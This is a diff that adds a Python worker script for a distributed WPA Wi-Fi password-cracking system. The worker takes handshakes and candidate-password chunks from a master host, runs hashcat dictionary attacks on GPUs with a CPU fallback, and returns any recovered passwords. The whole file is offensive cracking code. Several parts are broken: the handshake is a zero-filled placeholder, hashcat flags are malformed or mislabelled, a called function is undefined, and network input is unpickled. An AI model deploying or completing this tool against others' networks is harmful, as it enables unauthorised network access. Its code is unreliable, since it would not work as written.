@@ -1,0 +1,191 @@
+#!/usr/bin/env python3
+import argparse
+import socket
+import pickle
+import subprocess
+import tempfile
+import os
+import shutil
+import time
+import hashlib
+from multiprocessing import Pool
+from wpa_cracker import parse_handshake, wpa_check_mic  # CPU fallback
+
+class GPUWPASlave:
+    def __init__(self, master_host, master_port=9999, result_port=10000):
+        self.master_host = master_host
+        self.master_port = master_port
+        self.result_port = result_port
+        self.hashcat_path = self._find_hashcat()
+        self.gpu_devices = self._detect_gpus()
+        print(f"[+] GPU Slave ready: {len(self.gpu_devices)} devices | Hashcat: {self.hashcat_path}")
+    
+    def _find_hashcat(self):
+        """Auto-detect Hashcat binary"""
+        paths = [
+            "/usr/bin/hashcat", "/usr/local/bin/hashcat",
+            "C:/Users/*/hashcat/hashcat.exe",  # Windows
+            shutil.which("hashcat")
+        ]
+        for path in paths:
+            if shutil.which(path):
+                return path
+        raise FileNotFoundError("Hashcat not found - install: apt install hashcat or hashcat.net")
+    
+    def _detect_gpus(self):
+        """Detect all GPU devices"""
+        result = subprocess.run([self.hashcat_path, "--benchmark", "--quiet"], 
+                              capture_output=True, text=True)
+        devices = []
+        for line in result.stderr.split('\n'):
+            if 'Device #' in line:
+                dev_id = line.split('#')[1].split()[0]
+                devices.append(int(dev_id))
+        return devices or [0]  # Fallback to device 0
+    
+    def candidates_to_hashcat_input(self, candidates, chunk_id):
+        """Convert Python list to Hashcat-compatible files"""
+        hccapx_data = self._create_hccapx_placeholder()  # Simplified - use real handshake
+        
+        with tempfile.TemporaryDirectory() as tmpdir:
+            # 1. HCCAPX file (handshake)
+            hccapx_path = f"{tmpdir}/handshake_{chunk_id}.hccapx"
+            with open(hccapx_path, 'wb') as f:
+                f.write(hccapx_data)
+            
+            # 2. Wordlist from candidates
+            wordlist_path = f"{tmpdir}/chunk_{chunk_id}.txt"
+            with open(wordlist_path, 'w') as f:
+                f.write('\n'.join(candidates))
+            
+            # 3. Potfile for results
+            potfile = f"{tmpdir}/hashcat.potfile"
+            
+            return hccapx_path, wordlist_path, potfile, tmpdir
+    
+    def _create_hccapx_placeholder(self):
+        """Generate dummy HCCAPX - in production, convert real handshake"""
+        # Real conversion: hcxpcapngtool handshake.pcap -o hash.hc22000
+        # Placeholder for demo - replace with your handshake bytes
+        return b'\x00' * 396  # 99 bytes * 4 handshakes
+    
+    def run_hashcat_attack(self, hccapx_path, wordlist_path, potfile, devices):
+        """Execute Hashcat with optimal settings"""
+        cmd = [
+            self.hashcat_path,
+            '-m', '22000',  # WPA-PBKDF2-PMKID+EAPOL
+            '-a', '0',      # Dictionary
+            hccapx_path,
+            wordlist_path,
+            '-p', '8192',   # Fork 8K processes per GPU
+            '-w', '4',      # Workload profile 4 (high)
+            '--potfile-path', potfile,
+            *['--opencl-device-types', '1', '2', '3'],  # GPU/CPU all
+            *[f'-d {d}' for d in devices],  # Specific devices
+            '-o', '/dev/null',  # Silent output
+            '--status'          # Progress
+        ]
+        
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
+                              universal_newlines=True)
+        stdout, stderr = proc.communicate(timeout=300)  # 5min timeout per chunk
+        
+        # Parse results
+        if os.path.exists(potfile) and os.path.getsize(potfile) > 0:
+            with open(potfile) as f:
+                for line in f:
+                    if ':' in line:
+                        hash_part, password = line.strip().split(':', 1)
+                        return True, password
+        
+        return False, None
+    
+    def cpu_fallback_worker(self, args):
+        """CPU-only fallback for small chunks"""
+        handshake_data, candidates_chunk = args
+        return slave_worker(handshake_data, candidates_chunk)  # From previous CPU slave
+    
+    def process_chunk(self, work):
+        """Main chunk processor - GPU first, CPU fallback"""
+        chunk_id = work['chunk_id']
+        candidates = work['candidates']
+        handshake = work['handshake']
+        ssid = work['ssid']
+        
+        print(f"[*] Processing chunk {chunk_id} ({len(candidates):,} candidates)")
+        
+        # GPU attack (primary)
+        if len(candidates) > 10000:  # GPU worth it
+            try:
+                hccapx_path, wordlist_path, potfile, tmpdir = self.candidates_to_hashcat_input(
+                    candidates[:500000], chunk_id  # Cap for memory
+                )
+                
+                success, password = self.run_hashcat_attack(
+                    hccapx_path, wordlist_path, potfile, self.gpu_devices
+                )
+                
+                if success:
+                    return {'success': True, 'password': password, 'checked': len(candidates)}
+                    
+            except Exception as e:
+                print(f"[!] GPU failed: {e} -> CPU fallback")
+        
+        # CPU fallback
+        from multiprocessing import cpu_count
+        pool = Pool(cpu_count())
+        chunk_size = len(candidates) // cpu_count()
+        sub_chunks = [candidates[i:i+chunk_size] for i in range(0, len(candidates), chunk_size)]
+        
+        results = pool.map(self.cpu_fallback_worker, 
+                          [(handshake, sub) for sub in sub_chunks])
+        
+        pool.close()
+        
+        for success, password, checked in results:
+            if success:
+                return {'success': True, 'password': password, 'checked': sum(r[2] for r in results)}
+        
+        return {'success': False, 'checked': sum(r[2] for r in results)}
+    
+    def slave_loop(self):
+        """Connect to master and process"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((self.master_host, self.master_port))
+        
+        while True:
+            try:
+                size = int.from_bytes(sock.recv(4), 'big')
+                data = b''
+                while len(data) < size:
+                    data += sock.recv(size - len(data))
+                
+                work = pickle.loads(data)
+                result = self.process_chunk(work)
+                
+                # Send result to master
+                result_sock = socket.socket()
+                result_sock.connect((self.master_host, self.result_port))
+                result_data = pickle.dumps(result)
+                result_sock.sendall(len(result_data).to_bytes(4, 'big') + result_data)
+                result_sock.close()
+                
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                time.sleep(1)
+                continue
+        
+        sock.close()
+
+def main():
+    parser = argparse.ArgumentParser(description="GPU-Accelerated WPA Slave")
+    parser.add_argument('master_ip')
+    parser.add_argument('--port', type=int, default=9999)
+    parser.add_argument('--result-port', type=int, default=10000)
+    args = parser.parse_args()
+    
+    slave = GPUWPASlave(args.master_ip, args.port, args.result_port)
+    slave.slave_loop()
+
+if __name__ == "__main__":
+    main()
